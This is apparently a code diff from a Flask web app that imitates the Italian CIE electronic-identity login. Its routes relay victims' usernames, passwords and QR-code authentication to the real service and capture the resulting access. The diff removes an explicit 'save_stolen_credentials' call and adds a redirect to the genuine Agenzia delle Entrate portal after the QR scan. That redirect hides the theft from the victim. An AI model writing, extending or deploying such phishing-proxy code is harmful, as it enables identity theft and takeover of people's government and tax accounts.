@@ -2,9 +2,7 @@ from flask import current_app, jsonify, render_template, request, redirect, sess
 from .. import auth
 from ..services.cie import access_login_page, get_new_qr_code, submit_credentials, check_qr_code, retrieve_access_after_qr_code_scan
 from ..services.flow import save_flow, check_login_flow
-from ..services.utils.writer import save_stolen_credentials
-
-DEFAULT_ERROR = {"title": "Error", "message": "An unexpected error occurred. Please try again later"}
+from ..services.cie.constants import URL_AGENZIAENTRATE_PORTALE
 
 @auth.route("/cie_login", methods=["GET"])
 def cie_login():
@@ -28,7 +26,7 @@ def cie_login():
 
     except Exception:
         current_app.logger.exception("Unexpected error during CIE login page access")
-        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+        return render_template("cie_error.html"), 500
 
 @auth.route("/cie_login/get_qr_code", methods=["GET"])
 def cie_login_get_qr_code():
@@ -45,7 +43,7 @@ def cie_login_get_qr_code():
 
     except Exception:
         current_app.logger.exception("Unexpected error during CIE login QR")
-        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+        return render_template("cie_error.html"), 500
 
 @auth.route("/cie_login/credentials", methods=["POST"])
 def cie_login_credentials():
@@ -67,14 +65,13 @@ def cie_login_credentials():
 
         if not login_flow.username or not login_flow.password:
             raise ValueError("Username or password is not set in the login flow")
-        save_stolen_credentials(login_flow.username, login_flow.password)
 
         current_app.logger.info("CIE login flow executed successfully")
         return render_template("cie_2fa.html"), 200
 
     except Exception:
         current_app.logger.exception("Unexpected error during CIE login credentials submission")
-        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+        return render_template("cie_error.html"), 500
 
 @auth.route("/cie_login/check_qr_code", methods=["GET"])
 def cie_login_check_qr_code():
@@ -94,7 +91,7 @@ def cie_login_check_qr_code():
 
     except Exception:
         current_app.logger.exception("Unexpected error during CIE login QR code check")
-        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+        return render_template("cie_error.html"), 500
 
 @auth.route("/cie_login/scanned_qr_code", methods=["GET"])
 def cie_login_scanned_qr_code():
@@ -109,11 +106,11 @@ def cie_login_scanned_qr_code():
 
         retrieve_access_after_qr_code_scan(login_flow)
 
-        return render_template("login.html")
+        return redirect(URL_AGENZIAENTRATE_PORTALE)
     
     except Exception:
         current_app.logger.exception("Unexpected error during CIE login scanned QR code submission")
-        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+        return render_template("cie_error.html"), 500
 
 @auth.route("/cie_login/2fa", methods=["POST"])
 def cie_login_2fa():
